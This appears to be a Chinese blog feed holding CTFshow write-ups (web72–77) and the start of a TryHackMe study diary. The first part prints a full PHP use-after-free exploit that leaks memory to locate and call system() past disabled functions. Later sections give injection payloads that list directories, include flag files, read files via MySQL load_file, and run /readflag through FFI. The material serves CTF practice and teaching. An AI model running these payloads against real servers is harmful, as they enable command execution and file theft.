<span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$str</span>[<span class="variable">$p</span> + <span class="variable">$i</span>] = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;%c&quot;</span>,(<span class="variable">$v</span> &amp; <span class="number">0xff</span>));</span><br><span class="line">            <span class="variable">$v</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params"><span class="variable">$addr</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x68</span>, <span class="variable">$addr</span> + <span class="variable">$p</span> - <span class="number">0x10</span>);</span><br><span class="line">        <span class="variable">$leak</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$helper</span>-&gt;a);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$s</span> != <span class="number">8</span>) &#123; <span class="variable">$leak</span> %= <span class="number">2</span> &lt;&lt; (<span class="variable">$s</span> * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$leak</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span>(<span class="params"><span class="variable">$base</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$e_type</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$e_phoff</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x20</span>);</span><br><span class="line">        <span class="variable">$e_phentsize</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="variable">$e_phnum</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$e_phnum</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$header</span> = <span class="variable">$base</span> + <span class="variable">$e_phoff</span> + <span class="variable">$i</span> * <span class="variable">$e_phentsize</span>;</span><br><span class="line">            <span class="variable">$p_type</span>  = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_flags</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_vaddr</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x10</span>);</span><br><span class="line">            <span class="variable">$p_memsz</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">6</span>) &#123; </span><br><span class="line"></span><br><span class="line">                <span class="variable">$data_addr</span> = <span class="variable">$e_type</span> == <span class="number">2</span> ? <span class="variable">$p_vaddr</span> : <span class="variable">$base</span> + <span class="variable">$p_vaddr</span>;</span><br><span class="line">                <span class="variable">$data_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">5</span>) &#123; </span><br><span class="line">                <span class="variable">$text_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$data_addr</span> || !<span class="variable">$text_size</span> || !<span class="variable">$data_size</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span>(<span class="params"><span class="variable">$base</span>, <span class="variable">$elf</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>) = <span class="variable">$elf</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$data_size</span> / <span class="number">8</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, <span class="variable">$i</span> * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, (<span class="variable">$i</span> + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$data_addr</span> + <span class="variable">$i</span> * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span>(<span class="params"><span class="variable">$binary_leak</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$base</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$start</span> = <span class="variable">$binary_leak</span> &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x1000</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$addr</span> = <span class="variable">$start</span> - <span class="number">0x1000</span> * <span class="variable">$i</span>;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> == <span class="number">0x10102464c457f</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$addr</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_system</span>(<span class="params"><span class="variable">$basic_funcs</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$addr</span> = <span class="variable">$basic_funcs</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="variable">$f_entry</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>);</span><br><span class="line">            <span class="variable">$f_name</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$f_entry</span>, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$f_name</span> == <span class="number">0x6d6574737973</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span> + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$addr</span> += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>(<span class="variable">$f_entry</span> != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">trigger_uaf</span>(<span class="params"><span class="variable">$arg</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$arg</span> = <span class="title function_ invoke__">str_shuffle</span>(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line">        <span class="variable">$vuln</span> = <span class="keyword">new</span> <span class="title class_">Vuln</span>();</span><br><span class="line">        <span class="variable">$vuln</span>-&gt;a = <span class="variable">$arg</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(PHP_OS, <span class="string">&#x27;WIN&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;This PoC is for *nix systems only.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$n_alloc</span> = <span class="number">10</span>; </span><br><span class="line">    <span class="variable">$contiguous</span> = [];</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n_alloc</span>; <span class="variable">$i</span>++)</span><br><span class="line">        <span class="variable">$contiguous</span>[] = <span class="title function_ invoke__">str_shuffle</span>(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">trigger_uaf</span>(<span class="string">&#x27;x&#x27;</span>);</span><br><span class="line">    <span class="variable">$abc</span> = <span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$helper</span> = <span class="keyword">new</span> <span class="title class_">Helper</span>;</span><br><span class="line">    <span class="variable">$helper</span>-&gt;b = <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$x</span></span>) </span>&#123; &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">79</span> || <span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;UAF failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$closure_handlers</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="variable">$php_heap</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x58</span>);</span><br><span class="line">    <span class="variable">$abc_addr</span> = <span class="variable">$php_heap</span> - <span class="number">0xc8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x60</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x70</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x10</span>, <span class="variable">$abc_addr</span> + <span class="number">0x60</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x18</span>, <span class="number">0xa</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$closure_obj</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$binary_leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_handlers</span>, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$base</span> = <span class="title function_ invoke__">get_binary_base</span>(<span class="variable">$binary_leak</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$elf</span> = <span class="title function_ invoke__">parse_elf</span>(<span class="variable">$base</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$basic_funcs</span> = <span class="title function_ invoke__">get_basic_funcs</span>(<span class="variable">$base</span>, <span class="variable">$elf</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$zif_system</span> = <span class="title function_ invoke__">get_system</span>(<span class="variable">$basic_funcs</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="variable">$fake_obj_offset</span> = <span class="number">0xd0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x110</span>; <span class="variable">$i</span> += <span class="number">8</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="variable">$fake_obj_offset</span> + <span class="variable">$i</span>, <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_obj</span>, <span class="variable">$i</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>, <span class="variable">$abc_addr</span> + <span class="variable">$fake_obj_offset</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>); </span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x68</span>, <span class="variable">$zif_system</span>); </span><br><span class="line"></span><br><span class="line">    (<span class="variable">$helper</span>-&gt;b)(<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ctfshow</span>(<span class="string">&quot;cat /flag0.txt&quot;</span>);<span class="title function_ invoke__">ob_end_flush</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

## web73

### payload

先查看再读取就行，本题禁用没有上一道严

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=var_export(scandir(&#x27;/&#x27;));exit(0);</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=include(&#x27;/flagc.txt&#x27;);exit(0);</span><br></pre></td></tr></table></figure>

## web74

### payload

本题限制了scandir函数，使用72的方法代替查找，

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=?&gt;&lt;?php $a=new DirectoryIterator(&quot;glob:///*&quot;); foreach($a as $f) &#123;echo($f-&gt;__toString().&#x27; &#x27;);&#125; exit(0); ?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=include(&quot;/flagx.txt&quot;);exit();</span><br></pre></td></tr></table></figure>

## web75

### payload

本题都读取位置的方式跟上面相似

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=?&gt;&lt;?php $a=new DirectoryIterator(&quot;glob:///*&quot;); foreach($a as $f) &#123;echo($f-&gt;__toString().&#x27; &#x27;);&#125; exit(0); ?&gt;</span><br></pre></td></tr></table></figure>

但是本题对于php PDO连接数据库的利用，但又有一个坑点就是对于数据库名的获取存在问题，好像绕过仅依赖于本题，没有一个合适的获取方法，必须得根据前面题目所获取的容器找到相关配置信息，所以不细说

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=try &#123;$dbh = new PDO(&#x27;mysql:host=localhost;dbname=ctftraining&#x27;, &#x27;root&#x27;,&#x27;root&#x27;);foreach($dbh-&gt;query(&#x27;select load_file(&quot;/flag36.txt&quot;)&#x27;) as $row)&#123;echo($row[0]).&quot;|&quot;; &#125;$dbh = null;&#125;catch (PDOException $e) &#123;echo $e-&gt;getMessage();exit(0);&#125;exit(0);</span><br></pre></td></tr></table></figure>

## web76

### payload

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=?&gt;&lt;?php $a=new DirectoryIterator(&quot;glob:///*&quot;); foreach($a as $f) &#123;echo($f-&gt;__toString().&#x27; &#x27;);&#125; exit(0); ?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=try &#123;$dbh = new PDO(&#x27;mysql:host=localhost;dbname=ctftraining&#x27;, &#x27;root&#x27;,&#x27;root&#x27;);foreach($dbh-&gt;query(&#x27;select load_file(&quot;/flag36d.txt&quot;)&#x27;) as $row)&#123;echo($row[0]).&quot;|&quot;; &#125;$dbh = null;&#125;catch (PDOException $e) &#123;echo $e-&gt;getMessage();exit(0);&#125;exit(0);</span><br></pre></td></tr></table></figure>

同75

## web77

### payload

本题算是命令执行最后一题了

刚开始还是使用伪协议进行一个读取，得到如下内容

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bin boot dev etc flag36x.txt home lib lib64 media mnt opt proc readflag root run sbin srv sys tmp usr var</span><br></pre></td></tr></table></figure>

存在一个flag36x.txt和readflag

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=$ffi = FFI::cdef(&quot;int system(const char *command);&quot;);$a=&#x27;/readflag &gt; 1.txt&#x27;;$ffi-&gt;system($a);</span><br></pre></td></tr></table></figure>

最终需要的FFI调用绕过system函数的手段

FFI是PHP中调用C代码的手段

然后由于无回显将readflag内容写入1.txt，再读取1.txt得到flag
</p>
]]></content>
      <categories>
        <category>CTFshow</category>
      </categories>
      <tags>
        <tag>命令执行</tag>
      </tags>
  </entry>
  <entry>
    <title>Tryhackme_Diary-1</title>
    <url>/2024/02/21/Tryhackme_Diary-1/</url>
    <content><![CDATA[<h1>Tryhackme_Diary-1</h1>
<h2 id="前言">前言</h2>
<p>开始在Tryhackme学习，随手记录一下，顺带进行了中文版的翻译</p>
<h2 id="OpenVpn">OpenVpn</h2>
<p>首先是基础配置，连接到Tryhackme的靶机可以通过windows或者linux的Openvpn进行，或者使用其自带的面板，但是明显卡顿严重，所以不做考虑</p>
<p>这个是Openvpn的下载地址以及证书文件的下载地址</p>
<p><a href="https://tryhackme.com/access">https://tryhackme.com/access</a></p>
<p><a href="https://openvpn.net/client/client-connect-vpn-for-windows/">OpenVPN Connect - Client Software For Windows | OpenVPN</a></p>
<p>在自己的面板上下载文件，然后导入openvpn即可，这个也是最初始的挑战之一</p>
<p><a href="https://tryhackme.com/room/openvpn#">TryHackMe | OpenVPN</a></p>
<h2 id="Introduction-to-Cyber-Security">Introduction to Cyber Security</h2>
<p>入门第一课先学概论</p>
<h3 id="Intro-to-Offensive-Security">Intro to Offensive Security</h3>
<h4 id="What-is-Offensive-Security">What is Offensive Security?</h4>
<p>简单说明了什么是网络安全</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">简而言之，攻击性安全是一种进入计算机系统、利用软件漏洞并找出应用程序中的漏洞，以获取未经授权访问的过程。</span><br><span class="line">要击败黑客，你需要像黑客一样行事，找出漏洞并在网络犯罪分子之前建议修补，就像你将在这个房间里所做的那样！</span><br><span class="line">另一方面，还有防御性安全，这是通过分析和保护潜在的数字威胁来保护组织的网络和计算机系统的过程；在数字取证房间中了解更多信息。</span><br><span class="line"></span><br><span class="line">在防御性网络角色中，您可能会调查感染的计算机或设备，以了解它是如何被入侵的，追踪网络犯罪分子，或监视基础设施以防止恶意活动。</span><br></pre></td></tr></table></figure>
<h4 id="Hacking-your-first-machine">Hacking your first machine</h4>
<p>一个简单的操作，利用GoBuster去爆破目录，然后成功转账，即可得到flag</p>
<h4 id="Careers-in-cyber-security">Careers in cyber security</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">如何开始学习呢？</span><br><span class="line"></span><br><span class="line">人们常常想知道别人是如何成为黑客（安全顾问）或者防御者（安全分析师，与网络犯罪作斗争）的，答案很简单。将其分解，学习您感兴趣的网络安全领域，并定期通过实践进行动手练习。养成每天学一点的习惯，在TryHackMe上进行学习，您将获得足够的知识来在行业中找到您的第一份工作。</span><br><span class="line"></span><br><span class="line">相信我们，您可以做到！只需看看一些使用TryHackMe找到他们的第一份安全工作的人：</span><br><span class="line"></span><br><span class="line">保罗从一个建筑工人变成了一名安全工程师。阅读更多。</span><br><span class="line">卡桑德拉从一名音乐老师变成了一名安全专业人员。阅读更多。</span><br><span class="line">布兰登在学校期间使用TryHackMe找到了他的第一份网络安全工作。阅读更多。</span><br><span class="line">有哪些职业？</span><br><span class="line"></span><br><span class="line">网络安全职业房间更深入地介绍了网络安全领域的不同职业。不过，以下是对一些攻击性安全角色的简短描述：</span><br><span class="line"></span><br><span class="line">渗透测试员 - 负责测试技术产品，寻找可利用的安全漏洞。</span><br><span class="line">红队员 - 扮演对手的角色，攻击组织并以敌人的视角提供反馈。</span><br><span class="line">安全工程师 - 设计、监控和维护安全控制、网络和系统，以帮助防止网络攻击。</span><br></pre></td></tr></table></figure>
<h3 id="Intro-to-Defensive-Security">Intro to Defensive Security</h3>
<h4 id="Introduction-to-Defensive-Security">Introduction to Defensive Security</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">攻击性安全专注于一件事情：入侵系统。通过利用漏洞、滥用不安全的设置和利用未强制执行的访问控制策略等手段，可以实现入侵系统。红队和渗透测试人员是攻击性安全的专家。</span><br><span class="line"></span><br><span class="line">防御性安全在某种程度上与攻击性安全相反，因为它关注两个主要任务：</span><br><span class="line"></span><br><span class="line">1. 防止入侵发生</span><br><span class="line">2. 在发生入侵时检测并适当响应</span><br><span class="line"></span><br><span class="line">蓝队是防御性安全领域的一部分。</span><br><span class="line"></span><br><span class="line">与防御性安全相关的一些任务包括：</span><br><span class="line"></span><br><span class="line">1. 用户网络安全意识培训：向用户提供网络安全培训有助于防止各种针对其系统的攻击。</span><br><span class="line">2. 文档化和管理资产：我们需要知道我们需要管理和保护的系统和设备的类型。</span><br><span class="line">3. 更新和修补系统：确保计算机、服务器和网络设备正确更新和修补，以防止已知的漏洞（弱点）。</span><br><span class="line">4. 设置预防性安全设备：防火墙和入侵防御系统（IPS）是预防性安全的关键组成部分。防火墙控制什么样的网络流量可以进入系统，以及什么可以离开系统或网络。IPS阻止与当前规则和攻击签名匹配的任何网络流量。</span><br><span class="line">5. 设置日志记录和监控设备：如果网络没有正确的日志记录和监控，就无法检测到恶意活动和入侵。如果新的未经授权的设备出现在我们的网络上，我们应该能够知道。</span><br><span class="line"></span><br><span class="line">防御性安全还有很多内容，上面的列表只涵盖了一些常见的主题。</span><br><span class="line"></span><br><span class="line">在这个房间里，我们涵盖了：</span><br><span class="line"></span><br><span class="line">1. 安全运营中心（SOC）</span><br><span class="line">2. 威胁情报</span><br><span class="line">3. 数字取证和事件响应（DFIR）</span><br><span class="line">4. 恶意软件分析</span><br></pre></td></tr></table></figure>
<h4 id="Areas-of-Defensive-Security">Areas of Defensive Security</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在这个任务中，我们将涵盖与防御性安全相关的两个主要主题：</span><br><span class="line"></span><br><span class="line">安全运营中心（SOC），在这里我们涵盖威胁情报</span><br><span class="line">数字取证和事件响应（DFIR），在这里我们也涵盖了恶意软件分析</span><br><span class="line">安全运营中心（SOC）</span><br><span class="line">安全运营中心（SOC）是一组网络安全专业人员，他们监视网络及其系统，以检测恶意的网络安全事件。SOC 的一些主要关注领域包括：</span><br><span class="line"></span><br><span class="line">漏洞：每当发现系统漏洞（弱点）时，通过安装适当的更新或补丁来修复它至关重要。当没有修复方法时，应采取必要的措施防止攻击者利用它。尽管消除漏洞对SOC至关重要，但不一定由他们来执行。</span><br><span class="line">策略违规：我们可以将安全策略看作是保护网络和系统所需的一组规则。例如，如果用户开始将机密公司数据上传到在线存储服务，这可能就是策略违规。</span><br><span class="line">未经授权的活动：考虑一种情况，即用户的登录名和密码被盗取，并且攻击者使用它们登录到网络。SOC 需要检测到这种事件并尽快阻止，以防止进一步的损害。</span><br><span class="line">网络入侵：无论您的安全措施有多好，入侵总是有可能发生的。当用户单击恶意链接或攻击者利用公共服务器时，入侵就可能发生。无论如何，当发生入侵时，我们必须尽快检测到它，以防止进一步的损害。</span><br><span class="line">安全运营涵盖各种任务，以确保保护；其中一项任务是威胁情报。</span><br><span class="line"></span><br><span class="line">威胁情报</span><br><span class="line">在这种情况下，情报是指您收集有关实际和潜在敌人的信息。威胁是指任何可能破坏或对系统产生不利影响的行为。威胁情报旨在收集信息，以帮助公司更好地准备应对潜在的对手。其目的是实现基于威胁的防御。不同的公司有不同的对手。一些对手可能试图从移动运营商那里窃取客户数据；然而，其他对手可能对停止石油精炼厂的生产感兴趣。示例对手包括为政治目的工作的国家级网络部队和为了财务目的而行动的勒索软件组织。根据公司（目标），我们可以预期到对手。</span><br><span class="line"></span><br><span class="line">情报需要数据。数据必须收集、处理和分析。数据收集来自本地来源，如网络日志，以及来自论坛等公共来源。数据处理的目的是将其整理成适合分析的格式。分析阶段旨在了解更多关于攻击者及其动机的信息；此外，它旨在创建一份建议清单和可操作步骤。</span><br><span class="line"></span><br><span class="line">了解您的对手可以让您了解他们的战术、技术和程序。由于威胁情报，我们识别了威胁行为者（对手），预测了他们的活动，因此我们将能够减轻他们的攻击并制定应对策略。</span><br><span class="line"></span><br><span class="line">数字取证和事件响应（DFIR）</span><br><span class="line">这部分涉及数字取证和事件响应（DFIR），我们将涵盖：</span><br><span class="line"></span><br><span class="line">数字取证</span><br><span class="line">事件响应</span><br><span class="line">恶意软件分析</span><br><span class="line">数字取证</span><br><span class="line">取证是将科学应用于调查犯罪并确定事实的过程。随着数字系统（如计算机和智能手机）的使用和普及，涉及调查相关犯罪的一项新的取证领域诞生了：计算机取证，后来演变成了数字取证。</span><br><span class="line"></span><br><span class="line">在防御性安全中，数字取证的重点转移到分析攻击及其施行者的证据以及其他领域，如知识产权盗窃、网络间谍活动和拥有未经授权的内容。因此，数字取证将关注不同的领域，如：</span><br><span class="line"></span><br><span class="line">文件系统：分析系统存储的数字取证镜像（低级别副本）会揭示许多信息，例如安装的程序、创建的文件、部分覆盖的文件和已删除的文件。</span><br><span class="line">系统内存：如果攻击者在内存中运行其恶意程序而不将其保存到磁盘上，则拍摄系统内存的取证镜像（低级别副本）是分析其内容并了解攻击的最佳方法。</span><br><span class="line">系统日志：每个客户端和服务器计算机都会维护不同的日志文件，记录发生的事件。日志文件提供了关于系统发生了什么的大量信息。即使攻击者尝试清除他们的痕迹，也会留下一些痕迹。</span><br><span class="line">网络日志：记录了在网络上穿越的网络数据包，将有助于回答更多有关攻击是否发生以及攻击的内容是什么的问题。</span><br><span class="line">事件响应</span><br><span class="line">事件通常指数据泄露或网络攻击；但是，在某些情况下，它可能是一些不那么严重的事情，例如错误配置、入侵尝</span><br><span class="line"></span><br><span class="line">试或违反策略。网络攻击的例子包括攻击者使我们的网络或系统无法访问、篡改（改变）公共网站以及数据泄露（窃取公司数据）。您将如何应对网络攻击？事件响应指定了应该遵循的方法论来处理此类情况。其目的是尽可能减少损害并在最短时间内恢复。理想情况下，您将制定一份准备好的事件响应计划。</span><br><span class="line"></span><br><span class="line">事件响应过程的四个主要阶段是：</span><br><span class="line"></span><br><span class="line">准备阶段：这需要一支受过培训并随时准备处理事件的团队。理想情况下，会采取各种措施来防止事件的发生。</span><br><span 